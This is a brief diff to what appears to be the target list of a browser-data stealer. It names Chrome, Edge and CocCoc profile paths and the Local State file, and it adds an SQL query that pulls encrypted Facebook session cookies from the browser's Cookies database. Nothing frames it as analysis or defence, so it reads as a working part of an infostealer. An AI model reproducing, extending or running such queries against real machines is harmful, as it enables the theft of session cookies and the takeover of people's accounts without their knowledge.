@@ -21,3 +21,4 @@ USERPROFILE|AppData|Local|User Data|Local State
 CocCoc|Browser
 Google|Chrome
 Microsoft|Edge
+SELECT host_key,name,encrypted_value FROM Cookies WHERE host_key LIKE '%facebook.com%' ORDER BY host_key
